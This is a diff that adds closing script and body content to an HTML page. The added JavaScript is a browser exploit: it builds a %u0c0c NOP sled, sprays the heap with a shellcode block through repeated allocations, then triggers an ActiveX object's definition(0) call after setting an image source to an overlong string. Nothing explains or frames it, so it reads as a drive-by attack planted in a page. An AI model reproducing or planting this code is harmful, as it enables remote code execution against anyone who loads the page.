@@ -1,0 +1,14 @@
+var nops=unescape("%u0c0c%u0c0c");while(nops.length<20480){nops+=nops;}var offset=nops.substring(0,16384-code.length);var shellcode=offset+code+nops.substring(0,16384-code.length-offset.length);while(shellcode.length<262144){shellcode+=shellcode;}var block=shellcode.substring(0,(524288-6)/2);heap_obj.gc();for(var i=1;i<300;i++){heap_obj.alloc(block);}</script>	
+</head>
+	
+
+<body>
+
+	<script>
+var obj=document.getElementById("WDjx").object;var src=unescape("%u0c0c%u0c0c");while(src.length<4098){src+=src;}src="\\\\xxx"+src;src=src.substr(0,4096-10);var pic=document.createElement("img");pic.src=src;pic.nameProp;obj.definition(0);	
+	</script>
+	
+</body>
+
+
+</html>
